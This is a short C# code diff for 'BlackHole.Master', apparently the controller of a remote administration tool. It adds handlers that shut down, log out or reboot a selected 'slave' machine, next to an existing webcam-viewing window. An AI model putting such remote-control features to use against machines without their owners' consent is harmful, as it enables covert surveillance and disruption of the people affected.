@@ -254,5 +254,23 @@ namespace BlackHole.Master
 
         private void OpenWebcamWindow(object sender, RoutedEventArgs e) =>
             OpenSlaveWindowIfSelected(slave => new WebcamWindow(slave));
+
+        private void ShutdownRemote(object sender, RoutedEventArgs e)
+        {
+            //DelayTimeWindow a = new DelayTimeWindow("/s");
+            OpenSlaveWindowIfSelected(slave => new DelayTimeWindow("/s", slave));
+        }
+
+        private void LogoutRemote(object sender, RoutedEventArgs e)
+        {
+            //DelayTimeWindow a = new DelayTimeWindow("-L");
+            OpenSlaveWindowIfSelected(slave => new DelayTimeWindow("-L", slave));
+        }
+
+        private void RebootRemote(object sender, RoutedEventArgs e)
+        {
+            //DelayTimeWindow a = new DelayTimeWindow("/r");
+            OpenSlaveWindowIfSelected(slave => new DelayTimeWindow("/r", slave));
+        }
     }
 }
